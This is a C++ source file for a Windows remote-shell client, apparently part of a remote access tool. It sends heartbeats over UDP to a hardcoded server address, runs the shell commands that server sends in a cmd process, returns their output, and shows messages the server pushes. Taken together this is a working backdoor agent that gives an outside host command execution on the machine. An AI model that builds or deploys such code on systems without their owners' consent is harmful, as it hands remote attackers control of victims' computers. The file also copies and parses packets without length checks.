#include "RemoteClientFrameWork.h"


void ThreadMessageBox::run()
{
	MessageBox(NULL,m_MessageBox,"��Ϣ",MB_OK|MB_SETFOREGROUND);
}

void ThreadMessageBox::Show( const char *message )
{
	m_MessageBox=message;
	start();
}

ThreadMessageBox::ThreadMessageBox( const char * msg)
{
	Show(msg);
}

RemoteClientFrameWork G_RemoteFrameWork;

RemoteClientFrameWork::RemoteClientFrameWork(void)
{
}


RemoteClientFrameWork::~RemoteClientFrameWork(void)
{
}

BOOL RemoteClientFrameWork::Initialize()
{
	CmdProcess_IO cmdProcessIO;
	if (!m_CMD.Initialize(cmdProcessIO))
	{
		return FALSE;
	}

	Cube_SocketUDP_IO CubeSocketUDPio;
	
	CubeSocketUDPio.Port=REMOTESHELL_CLIENT_PORT;
	
	if (!m_Net.Initialize(CubeSocketUDPio))
	{
		return FALSE;
	}


	m_to.sin_family=AF_INET;

	if (INADDR_NONE == inet_addr(REMOTESHELL_SERVER_IPADDR))
		return FALSE;
	m_to.sin_addr.s_addr=inet_addr(REMOTESHELL_SERVER_IPADDR);

	m_to.sin_port=htons(REMOTESHELL_SERVER_PORT);

	return TRUE;
}

void RemoteClientFrameWork::OnHeartBeat()
{
	static Packet_Client_HeartBeat HeartBeat;
	Cube_SocketUDP_O __O;
	__O.Buffer=&HeartBeat;
	__O.Size=sizeof(Packet_Client_HeartBeat);
	__O.to=m_to;
	m_Net.Send(__O);
}

void RemoteClientFrameWork::OnNetRecv( Cube_SocketUDP_I& __I)
{
	CmdProcess_O __O;

	if (__I.in.sin_addr.S_un.S_addr!=m_to.sin_addr.S_un.S_addr)
	{
		return ;
	}

	Packet *pack=(Packet *)__I.Buffer;

	switch(pack->TypeFLAG)
	{
	case PACKET_TYPEFLAG_CLIENT_CMD:
		__O.Buffer=((Packet_Client_CMD *)__I.Buffer)->command;
		__O.size=strlen(__O.Buffer);
		m_CMD.Send(__O);
		ResponeSucceeded();
		break;
	case PACKET_TYPEFLAG_CLIENT_MSG:
		m_Msg.Show(((Packet_Client_Message *)__I.Buffer)->message);
		ResponeSucceeded();
		break;
	}

}

void RemoteClientFrameWork::OnCmdReply( char *r,int Size )
{
	Packet_Client_Reply Reply;
	strcpy_s(Reply.Reply,r);


	Cube_SocketUDP_O __O;
	__O.Buffer=&Reply;
	__O.Size=sizeof(Packet_Client_Reply);
	__O.to=m_to;
	m_Net.Send(__O);
}

void RemoteClientFrameWork::ResponeSucceeded()
{
	Packet_Client_ExecuteReply Reply;
	Cube_SocketUDP_O __O;
	__O.Buffer=&Reply;
	__O.Size=sizeof(Packet_Client_ExecuteReply);
	__O.to=m_to;

	m_Net.Send(__O);
}

void RemoteClientFrameWork::Run()
{
	m_HeartBeat.start();
	m_CMD.start();
	m_Net.start();
}
